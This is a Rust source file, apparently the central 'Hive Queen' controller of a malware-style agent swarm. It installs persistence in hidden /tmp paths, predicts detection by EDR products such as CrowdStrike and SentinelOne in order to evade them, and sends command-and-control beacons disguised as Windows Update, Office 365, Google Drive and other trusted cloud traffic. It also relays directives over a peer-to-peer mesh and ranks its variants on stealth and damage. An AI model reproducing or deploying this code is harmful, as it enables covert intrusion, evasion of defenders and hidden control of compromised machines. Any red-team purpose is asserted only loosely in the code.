use hive_base::{AgentIdentity, ConsensusEngine, HiveChamber, Message, Payload, Role};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;
use tokio::time;
use tracing::{info, warn};
use uuid::Uuid;

// Phoenix — persistence heartbeat
use hive_base::phoenix::Phoenix;
use hive_base::phoenix::AgentBlueprint;

// Seer — detection prediction & steering
use hive_base::seer::Seer;
use hive_base::seer::{SeerAction, TelemetrySample};

// Smoke Signals — camouflaged C2 beacons
use hive_base::smoke_signals::{C2Message, SmokeChannel, SmokeDirector};

#[derive(Debug, Serialize, Deserialize)]
struct LLMResponse {
    accion: String,
    confianza: f32,
}

#[derive(Debug, Serialize)]
struct OllamaRequest {
    model: String,
    prompt: String,
    stream: bool,
}

#[derive(Debug, Deserialize)]
struct OllamaResponse {
    response: String,
}

struct OvermindAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    ollama_url: String,
    model: String,
    heartbeat_interval: Duration,
    tournament: hive_base::tournament::Tournament,
    hivemind: hive_base::hivemind::HiveMind,
    whispernet: hive_base::whispernet::WhisperNet,
    last_tournament_gen: usize,
    seer: Seer,
    smoke_director: SmokeDirector,
}

impl OvermindAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        let comms = HiveChamber::connect(&identity, Role::Queen)
            .await
            .expect("Failed to connect to colmena arena");

        info!("Queen connected to shared-memory arena");

        let whispernet = hive_base::whispernet::WhisperNet::new(
            hive_base::whispernet::WhisperConfig {
                node_id: identity.id(),
                listen_port: 0,
                max_peers: 16,
                max_hops: 5,
                heartbeat_interval_secs: 60,
                encryption_enabled: true,
            }
        );

        let seer = Seer::new();

        let mut smoke_director = SmokeDirector::new();
        smoke_director.add_channel(SmokeChannel::WindowsUpdate);
        smoke_director.add_channel(SmokeChannel::Office365);
        smoke_director.add_channel(SmokeChannel::AzureServiceBus);
        smoke_director.add_channel(SmokeChannel::GoogleDrive);
        smoke_director.add_channel(SmokeChannel::GitHubActions);
        smoke_director.add_channel(SmokeChannel::ApplePush);
        smoke_director.add_channel(SmokeChannel::CloudFrontCDN);

        Self {
            comms, identity,
            consensus: ConsensusEngine::new(0.66),
            ollama_url: "http://localhost:11434".to_string(),
            model: "tinyllama".to_string(),
            heartbeat_interval: Duration::from_secs(10),
            tournament: hive_base::tournament::Tournament::new(),
            hivemind: hive_base::hivemind::HiveMind::new(),
            whispernet,
            last_tournament_gen: 0,
            seer,
            smoke_director,
        }
    }

    fn build_prompt(&self, dilemma: &str, context: &str) -> String {
        format!(
            "[INST] <<SYS>>\nEres un asesor tactico de red team.\nResponde solo con JSON: {{\"accion\": \"...\", \"confianza\": 0.0-1.0}}\n<</SYS>>\nContexto: {}\nPregunta: {} [/INST]",
            context, dilemma
        )
    }

    async fn query_llm(&self, prompt: String) -> Option<LLMResponse> {
        let client = reqwest::Client::new();
        let request = OllamaRequest {
            model: self.model.clone(),
            prompt,
            stream: false,
        };

        match client.post(format!("{}/api/generate", self.ollama_url)).json(&request).send().await {
            Ok(resp) => match resp.json::<OllamaResponse>().await {
                Ok(r) => {
                    info!("LLM: {}", r.response);
                    serde_json::from_str(&r.response).ok()
                }
                Err(e) => { warn!("Parse error: {}", e); None }
            },
            Err(e) => { warn!("Ollama unavailable at {}: {}", self.ollama_url, e); None }
        }
    }

    async fn publish_msg(&self, msg: Message) {
        self.comms.publish(msg).await;
    }

    async fn send_heartbeat(&self) {
        self.comms.send_heartbeat().await;
    }

    async fn process_incoming(&mut self) {
        let messages = self.comms.read_new().await;

        for msg in messages {
            self.consensus.process_message(&msg);
            match &msg.payload {
                Payload::Query { dilemma, context, query_id } => {
                    info!("Query from {}: {}", msg.agent_role, dilemma);
                    let prompt = self.build_prompt(dilemma, context);

                    let answer = if let Some(resp) = self.query_llm(prompt).await {
                        info!("LLM: {} (conf: {})", resp.accion, resp.confianza);
                        resp.accion
                    } else {
                        warn!("LLM unavailable, defaulting to wait");
                        "wait".to_string()
                    };

                    let resp_msg = Message {
                        agent_id: self.identity.id(),
                        agent_role: Role::Queen,
                        timestamp: hive_base::utils::timestamp_now(),
                        payload: Payload::Response {
                            query_id: *query_id,
                            answer,
                            confidence: 0.5,
                        },
                    };
                    self.publish_msg(resp_msg).await;
                }
                Payload::Belief { asset, value: _value, confidence: _confidence }
                    // Check for HiveMind proposals in beliefs
                    if asset.starts_with("hivemind:") => {
                        info!("HiveMind: received proposal belief: {}", asset);
                    }
                Payload::Proposal { action, argument, proposal_id } => {
                    // HiveMind: register as a directive proposal
                    let mut params = HashMap::new();
                    params.insert("action".into(), action.clone());
                    params.insert("argument".into(), argument.clone());
                    self.hivemind.propose_from_operator(self.identity.id(), action.clone(), params);
                    info!("HiveMind: registered proposal {} from {}", proposal_id, msg.agent_role);
                }
                _ => {}
            }
        }

        // HiveMind: tally votes for pending directives
        if self.hivemind.enabled {
            let mut rep_map = HashMap::new();
            rep_map.insert(self.identity.id(), 1.0);
            let pending_ids: Vec<Uuid> = self.hivemind.get_pending_directives().iter()
                .map(|d| d.directive_id).collect();
            for did in pending_ids {
                self.hivemind.tally_votes(did, &rep_map);
            }
            for executed_id in self.hivemind.execute_approved() {
                info!("HiveMind: directive {} approved and executed", executed_id);
                let directive = self.hivemind.directives.iter()
                    .find(|d| d.directive_id == executed_id).unwrap();
                let msg = self.hivemind.to_belief(directive, self.identity.id());
                self.publish_msg(msg).await;

                // WhisperNet: broadcast approved directive as P2P fallback
                let whisper_payload = serde_json::to_vec(&directive).unwrap_or_default();
                let whisper_msg = hive_base::whispernet::WhisperMessage {
                    msg_id: Uuid::new_v4(),
                    sender_id: self.identity.id(),
                    seq: 0,
                    payload: whisper_payload,
                    ttl: self.whispernet.config().max_hops,
                    signature: vec![],
                    timestamp: hive_base::utils::timestamp_now(),
                };
                if self.whispernet.send_message(whisper_msg).await.is_ok() {
                    info!("WhisperNet: broadcast directive {}", executed_id);
                }
            }
        }
    }

    /// Run a darwinian tournament
    async fn run_tournament(&mut self) {
        let config = hive_base::tournament::TournamentConfig {
            target: format!("tournament-gen-{}", self.last_tournament_gen),
            competitors: 3,
            criteria: vec![
                hive_base::tournament::WinCriteria::Speed,
                hive_base::tournament::WinCriteria::Stealth,
                hive_base::tournament::WinCriteria::Damage,
            ],
            timeout_secs: 300,
            generations: 2,
        };

        info!("Queen: starting darwinian tournament gen {}", self.last_tournament_gen);
        let result = self.tournament.run_tournament(&config);

        if result.winner_id != Uuid::nil() {
            info!("Queen: tournament winner {}", result.winner_id);
            let msg = Message::belief(
                self.identity.id(), Role::Queen,
                "tournament_winner".into(),
                hive_base::Value::String(format!("{}", result.winner_id)),
                1.0,
            );
            self.publish_msg(msg).await;
        }

        self.last_tournament_gen += 1;
    }

    /// Install persistence mechanisms via Phoenix at startup.
    async fn seeds_phoenix(&self) {
        let loader_script = std::env::current_exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| "/tmp/.hive_queen".to_string());
        let base_path = std::path::Path::new("/tmp/.hive_persistence");
        let mechs = Phoenix::install_persistence(&loader_script, base_path);
        for m in &mechs {
            info!("Phoenix: {} installed at {}", m.name, m.path);
        }
    }

    async fn run(&mut self) {
        info!("Hive Queen starting | ID: {}", self.identity.id());
        info!("Ollama: {} | Model: {}", self.ollama_url, self.model);
        self.send_heartbeat().await;

        // Phoenix — seed persistence at startup
        self.seeds_phoenix().await;

        let mut heartbeat_timer = time::interval(self.heartbeat_interval);
        let mut tournament_timer = time::interval(Duration::from_secs(600));
        let mut hivemind_timer = time::interval(Duration::from_secs(120));
        let mut whisper_timer = time::interval(Duration::from_secs(60));

        // New timers for Wire Seer, Smoke Signals, Phoenix heartbeat
        let mut phoenix_timer = time::interval(Duration::from_secs(300));
        let mut seer_timer = time::interval(Duration::from_secs(120));
        let mut smoke_timer = time::interval(Duration::from_secs(1800));

        loop {
            tokio::select! {
                _ = heartbeat_timer.tick() => { self.send_heartbeat().await; }
                _ = tournament_timer.tick() => { self.run_tournament().await; }
                _ = hivemind_timer.tick() => {
                    if !self.hivemind.enabled {
                        self.hivemind.enabled = true;
                        info!("HiveMind: activated");
                        let msg = Message::belief(
                            self.identity.id(), Role::Queen,
                            "hivemind_active".into(),
                            hive_base::Value::Bool(true), 1.0,
                        );
                        self.publish_msg(msg).await;
                    }
                }
                _ = whisper_timer.tick() => {
                    self.whispernet.rebuild_routing_table();
                    info!("WhisperNet: {} peers, {} msgs routed",
                        self.whispernet.peers().len(), self.whispernet.messages().len());
                }
                // ── Phoenix: genome heartbeat every 300s ──────────────────────
                _ = phoenix_timer.tick() => {
                    let blueprint = AgentBlueprint {
                        role: "queen".into(),
                        binary_hash: format!("{}", self.identity.id()),
                        binary_size: 0,
                        policy: {
                            let mut p = HashMap::new();
                            p.insert("model".into(), self.model.clone());
                            p.insert("heartbeat_interval".into(), format!("{}", self.heartbeat_interval.as_secs()));
                            p
                        },
                        encrypted_chunk: vec![],
                    };
                    let genome = Phoenix::generate_genome(vec![blueprint]);
                    let mut fragments = Phoenix::fragment_genome(&genome, 4);
                    for frag in &mut fragments {
                        if let Ok(msg) = Phoenix::hide(frag, &std::path::Path::new("/tmp/.hive_genome")) {
                            info!("Phoenix: {}", msg);
                        }
                    }
                }
                // ── Seer: detection prediction & steering every 120s ──────────
                _ = seer_timer.tick() => {
                    // Build telemetry sample from arena stats
                    let sample = TelemetrySample {
                        edr_process_count: 0,
                        total_processes: self.whispernet.peers().len() as u32 + 100,
                        uptime_hours: 24,
                        firewall_rules: 10,
                        logged_in_users: 2,
                        listening_ports: 5,
                        has_defender: false,
                        has_sentinelone: false,
                        has_crowdstrike: false,
                        has_carbonblack: false,
                        has_symantec: false,
                        is_vm: false,
                        is_domain_controller: false,
                        is_server_os: false,
                    };
                    self.seer.update_prediction(&sample, "colony_heartbeat");
                    if let Some(pred) = self.seer.last_prediction() {
                        info!("Seer: detection prob {:.2}, vector: {}, confidence {:.2}",
                            pred.probability, pred.most_likely_vector, pred.confidence);
                    }

                    let action = self.seer.recommend_action();
                    info!("Seer: recommended action {:?}", action);

                    match action {
                        SeerAction::Retreat => {
                            // Publish SafetyTrigger belief to warn the colony
                            let msg = Message::belief(
                                self.identity.id(), Role::Queen,
                                "SafetyTrigger".into(),
                                hive_base::Value::Bool(true),
                                1.0,
                            );
                            self.publish_msg(msg).await;
                            info!("Seer: SafetyTrigger published — colony alerted");
                        }
                        SeerAction::Scramble => {
                            // Call steer() and execute any returned directive
                            if let Some(directive_id) = self.seer.steer(&mut self.hivemind, 0.5) {
                                info!("Seer: scramble proposed directive {}", directive_id);
                                // Tally and execute the directive
                                let mut rep_map = HashMap::new();
                                rep_map.insert(self.identity.id(), 1.0);
                                self.hivemind.tally_votes(directive_id, &rep_map);
                                for executed_id in self.hivemind.execute_approved() {
                                    let directive = self.hivemind.directives.iter()
                                        .find(|d| d.directive_id == executed_id).unwrap();
                                    let msg = self.hivemind.to_belief(directive, self.identity.id());
                                    self.publish_msg(msg).await;
                                    info!("Seer: scramble directive {} executed", executed_id);
                                }
                            }
                        }
                        SeerAction::Proceed => {
                            // Low risk — continue normal operations
                        }
                    }
                }
                // ── Smoke Signals: colony heartbeat beacon every 30 min ──────
                _ = smoke_timer.tick() => {
                    let mut args = HashMap::new();
                    args.insert("peer_count".into(), format!("{}", self.whispernet.peers().len()));
                    args.insert("directive_count".into(), format!("{}", self.hivemind.directives.len()));
                    args.insert("agent_id".into(), format!("{}", self.identity.id()));
                    let c2msg = C2Message::new("colony_heartbeat".into(), args);
                    let payload = c2msg.to_beacon_payload();
                    match self.smoke_director.beacon_round_robin(&payload).await {
                        Ok(_) => info!("Smoke: colony heartbeat sent via round-robin"),
                        Err(e) => warn!("Smoke: beacon failed: {}", e),
                    }
                }
                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
            }
        }
    }
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("queen");
    info!("Initializing Hive Queen...");
    let mut overmind = OvermindAgent::new().await;
    overmind.run().await;
}
